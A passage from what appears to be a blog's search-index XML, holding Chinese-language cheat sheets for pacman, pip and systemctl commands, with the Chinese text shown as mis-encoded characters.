    <content><![CDATA[<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‡çº§æ•´ä¸ªç³»ç»Ÿï¼Œ-y æ›´æ–°æ•°æ®åº“, -yy å¼ºåˆ¶æ›´æ–°, -uæ˜¯å‡çº§è½¯ä»¶</span></span><br><span class="line">pacman -Syu</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…é™¤è½¯ä»¶ç¼“å­˜ï¼Œå³/var/cache/pacman/pkgç›®å½•ä¸‹çš„æ–‡ä»¶</span></span><br><span class="line">pacman -Sc</span><br></pre></td></tr></table></figure>

<h2 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœ¨åŒ…æ•°æ®åº“ä¸­æŸ¥è¯¢è½¯ä»¶</span></span><br><span class="line">pacman -Ss &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºè½¯ä»¶çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">pacman -Si &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŒ…</span></span><br><span class="line">pacman -Qs &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æœ¬åœ°å®‰è£…åŒ…çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">pacman -Qi &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å·²å®‰è£…è½¯ä»¶æ‰€åŒ…å«çš„æ–‡ä»¶çš„åˆ—è¡¨</span></span><br><span class="line">pacman -Ql &lt;package&gt;	</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…è½¯ä»¶</span></span><br><span class="line">pacman -S &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¸åŒä»“åº“ä¸­çš„ç‰ˆæœ¬</span></span><br><span class="line">pacman -S &lt;extra&gt;/&lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æœ¬åœ°æ–‡ä»¶å®‰è£…</span></span><br><span class="line">pacman -U package.tar.zx</span><br></pre></td></tr></table></figure>



<h2 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤å•ä¸ªè½¯ä»¶</span></span><br><span class="line">pacman -R &lt;package&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æŒ‡å®šè½¯ä»¶åŠå…¶æ²¡æœ‰è¢«å…¶ä»–å·²å®‰è£…è½¯ä»¶ä½¿ç”¨çš„ä¾èµ–å…³ç³»</span></span><br><span class="line">pacman -Rs &lt;package&gt; </span><br></pre></td></tr></table></figure>



<h2 id="å…¶å®ƒå‘½ä»¤"><a href="#å…¶å®ƒå‘½ä»¤" class="headerlink" title="å…¶å®ƒå‘½ä»¤"></a>å…¶å®ƒå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ˜¾ç¤ºè½¯ä»¶çš„ä¾èµ–æ ‘</span></span><br><span class="line">pactree &lt;package&gt;  </span><br></pre></td></tr></table></figure>



<h2 id="åƒè±†äººå½©è›‹"><a href="#åƒè±†äººå½©è›‹" class="headerlink" title="åƒè±†äººå½©è›‹"></a>åƒè±†äººå½©è›‹</h2><p>ç¼–è¾‘é…ç½®æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>pacman.conf</span><br></pre></td></tr></table></figure>

<p>å–æ¶ˆ <code>#Color</code> ä¸€è¡Œçš„æ³¨é‡Š, åœ¨ä¸‹é¢æ·»åŠ  <code>ILoveCandy</code></p>
<img data-src="http://img.owq.world/2022/09/1046-12bc31.png" alt="" style="zoom:50%;" />

<p>æ•ˆæœå±•ç¤º</p>
<p><img data-src="http://img.owq.world/2022/09/1037-bc566b.png"></p>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pip å‘½ä»¤</title>
    <url>/pip/</url>
    <content><![CDATA[<h2 id="Linux-å®‰è£…"><a href="#Linux-å®‰è£…" class="headerlink" title="Linux å®‰è£…"></a>Linux å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install python3-pip</span><br></pre></td></tr></table></figure>



<h2 id="åŸºç¡€å‘½ä»¤"><a href="#åŸºç¡€å‘½ä»¤" class="headerlink" title="åŸºç¡€å‘½ä»¤"></a>åŸºç¡€å‘½ä»¤</h2><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">pip list			<span class="meta"># æ˜¾ç¤ºå·²å®‰è£…çš„åº“</span></span><br><span class="line">pip list -o			<span class="meta"># æ˜¾ç¤ºå·²è¿‡æ—¶çš„åº“</span></span><br><span class="line">pip <span class="keyword">show</span> &lt;<span class="keyword">library</span>&gt;		<span class="meta"># æ˜¾ç¤ºåº“ä¿¡æ¯</span></span><br><span class="line">pip install &lt;<span class="keyword">library</span>&gt;		<span class="meta"># å®‰è£…åº“</span></span><br><span class="line">pip install -U &lt;<span class="keyword">library</span>&gt;	<span class="meta"># æ›´æ–°åº“</span></span><br><span class="line">pip uninstall &lt;<span class="keyword">library</span>&gt;		<span class="meta"># å¸è½½åº“</span></span><br><span class="line">pip check &lt;<span class="keyword">library</span>&gt;		<span class="meta"># æ£€æŸ¥ä¾èµ–</span></span><br><span class="line">pip [cmd] -h			<span class="meta"># æ˜¾ç¤ºå¸®åŠ©</span></span><br></pre></td></tr></table></figure>

<h2 id="å¯¼å‡ºå·²å®‰è£…åŒ…"><a href="#å¯¼å‡ºå·²å®‰è£…åŒ…" class="headerlink" title="å¯¼å‡ºå·²å®‰è£…åŒ…"></a>å¯¼å‡ºå·²å®‰è£…åŒ…</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="ä»æ–‡ä»¶é€’å½’å®‰è£…"><a href="#ä»æ–‡ä»¶é€’å½’å®‰è£…" class="headerlink" title="ä»æ–‡ä»¶é€’å½’å®‰è£…"></a>ä»æ–‡ä»¶é€’å½’å®‰è£…</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="å…¶å®ƒé…ç½®"><a href="#å…¶å®ƒé…ç½®" class="headerlink" title="å…¶å®ƒé…ç½®"></a>å…¶å®ƒé…ç½®</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®é»˜è®¤ä½¿ç”¨pip3</span></span><br><span class="line">pip3 intall <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure>



<h2 id="æºé…ç½®"><a href="#æºé…ç½®" class="headerlink" title="æºé…ç½®"></a>æºé…ç½®</h2><h3 id="ä¸´æ—¶ä½¿ç”¨"><a href="#ä¸´æ—¶ä½¿ç”¨" class="headerlink" title="ä¸´æ—¶ä½¿ç”¨"></a>ä¸´æ—¶ä½¿ç”¨</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[module]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.org/simple</span></span><br></pre></td></tr></table></figure>

<h3 id="å…¨å±€é…ç½®"><a href="#å…¨å±€é…ç½®" class="headerlink" title="å…¨å±€é…ç½®"></a>å…¨å±€é…ç½®</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®˜æ–¹æº</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.org/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># é˜¿é‡Œæº</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…åæº</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># è…¾è®¯æº</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://mirrors.cloud.tencent.com/pypi/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># è±†ç“£æº</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>systemctl å‘½ä»¤</title>
    <url>/systemctl/</url>
    <content><![CDATA[<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start &lt;servicename&gt;    	<span class="comment"># å¯åŠ¨æœåŠ¡</span></span><br><span class="line">systemctl stop &lt;servicename&gt;     	<span class="comment"># å…³é—­æœåŠ¡</span></span><br><span class="line">systemctl restart &lt;servicename&gt;		<span class="comment"># é‡å¯æœåŠ¡</span></span><br><span class="line">systemctl reload &lt;servicename&gt;    	<span class="comment"># é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</span></span><br><span class="line">systemctl status &lt;servicename&gt;    	<span class="comment"># æŸ¥çœ‹æœåŠ¡çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æœåŠ¡çš„é…ç½®æ–‡ä»¶</span></span><br><span class="line">systemctl <span class="built_in">cat</span> &lt;servicename&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰æœåŠ¡çš„çŠ¶æ€</span></span><br><span class="line">systemctl -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºå½“å‰ç³»ç»ŸæœåŠ¡çŠ¶æ€</span></span><br><span class="line">systemctl list-units</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºæœåŠ¡çš„ä¾èµ–å…³ç³»</span></span><br><span class="line">systemctl list-dependencies &lt;servicename&gt;</span><br></pre></td></tr></table></figure>



<h2 id="ç”µæºç›¸å…³"><a href="#ç”µæºç›¸å…³" class="headerlink" title="ç”µæºç›¸å…³"></a>ç”µæºç›¸å…³</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl reboot		<span class="comment"># é‡å¯æœºå™¨</span></span><br><span class="line">systemctl poweroff		<span class="comment"># å…³æœº</span></span><br><span class="line">systemctl <span class="built_in">suspend</span>		<span class="comment"># æŒ‚èµ· - ç¡çœ  - ä¿å­˜åœ¨å…§å­˜</span></span><br><span class="line">systemctl hibernate		<span class="comment"># ä¼‘çœ  - æ–­ç”µ - ä¿å­˜åœ¨ç¡¬ç›˜</span></span><br><span class="line">systemctl hybrid-sleep		<span class="comment"># æ··åˆä¼‘çœ æ¨¡å¼ï¼ˆåŒæ—¶ä¼‘çœ åˆ°ç¡¬ç›˜å¹¶æŒ‚èµ·ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç³»ç»Ÿå¼•å¯¼æ—¶é—´</span></span><br><span class="line">systemd-analyze time		<span class="comment"># ä»…æ˜¾ç¤ºæ—¶é—´</span></span><br><span class="line">systemd-analyze blame		<span class="comment"># æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹æ¶ˆè€—æ—¶é—´</span></span><br><span class="line">systemd-analyze plot		<span class="comment"># ç”Ÿæˆç½‘é¡µ</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>systemctl</tag>
      </tags>
  </entry>
</search>
